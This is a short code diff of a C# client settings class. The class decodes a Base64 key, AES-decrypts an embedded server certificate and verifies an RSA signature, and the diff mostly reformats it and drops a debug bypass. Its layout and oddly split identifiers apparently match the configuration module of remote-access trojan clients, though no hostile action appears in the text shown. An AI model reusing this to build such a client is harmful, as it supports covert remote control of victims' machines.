@@ -1,10 +1,9 @@
-﻿using Client.Algorithm;
-using Client.Helper;
-using System;
-using System.IO;
+﻿using System;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
+using Client.Algorithm;
+using Client.Helper;
 
 namespace Client
 {
@@ -56,9 +55,6 @@ namespace Client
 
         public static bool InitializeSettings()
         {
-#if DEBUG
-            return true;
-#endif
             try
             {
                 Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
@@ -78,16 +74,21 @@ namespace Client
                 Server_Certificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certifi_cate)));
                 return VerifyHash();
             }
-            catch { return false; }
+            catch
+            {
+                return false;
+            }
         }
+
         private static bool VerifyHash()
         {
             try
             {
                 var csp = (RSACryptoServiceProvider)Server_Certificate.PublicKey.Key;
-                using (SHA256Managed sha = new SHA256Managed())
+                using (var sha = new SHA256Managed())
                 {
-                    return csp.VerifyHash(sha.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Server_signa_ture));
+                    return csp.VerifyHash(sha.ComputeHash(Encoding.UTF8.GetBytes(Key)),
+                        CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Server_signa_ture));
                 }
             }
             catch (Exception)
